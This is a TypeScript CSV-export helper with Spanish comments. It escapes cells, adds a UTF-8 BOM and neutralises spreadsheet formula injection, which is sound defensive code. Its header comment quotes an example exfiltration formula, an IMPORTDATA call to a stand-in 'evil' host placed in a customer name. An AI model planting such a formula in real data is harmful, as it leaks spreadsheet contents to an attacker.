/**
 * CSV builder server-side. Sin librería: el formato es simple y agregar
 * `papaparse` solo para serializar 6 columnas es overkill.
 *
 * Reglas de escape:
 *   - Cualquier valor con coma, comilla doble, salto de línea o CR se
 *     envuelve en comillas dobles.
 *   - Las comillas dobles dentro del valor se duplican (`"` → `""`).
 *   - Prefijo CSV injection: si el valor empieza con `=`, `+`, `-` o `@`,
 *     anteponemos un apóstrofe para que Excel/LibreOffice no lo evalúen
 *     como fórmula DDE (vector OWASP de exfiltración: un cliente con
 *     nombre `=IMPORTDATA("https://evil/")` ejecuta esa fórmula al abrir
 *     el CSV el owner).
 *
 * Encoding: agregamos BOM UTF-8 al inicio para que Excel detecte UTF-8
 * y abra correctamente tildes y ñ. Sin BOM, Excel asume Windows-1252 y
 * muestra "café" como "café".
 */

const BOM = "﻿";

const FORMULA_PREFIXES = new Set(["=", "+", "-", "@"]);

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let str = value instanceof Date ? value.toISOString() : String(value);
  if (str.length > 0 && FORMULA_PREFIXES.has(str[0]!)) {
    str = `'${str}`;
  }
  if (/[",\r\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

export function rowsToCsv(headers: string[], rows: unknown[][]): string {
  const lines = [headers.map(escapeCell).join(",")];
  for (const row of rows) {
    lines.push(row.map(escapeCell).join(","));
  }
  return BOM + lines.join("\r\n") + "\r\n";
}

/** Helper para crear el filename con fecha YYYY-MM-DD. */
export function csvFilename(base: string): string {
  const today = new Date().toISOString().slice(0, 10);
  return `${base}-${today}.csv`;
}
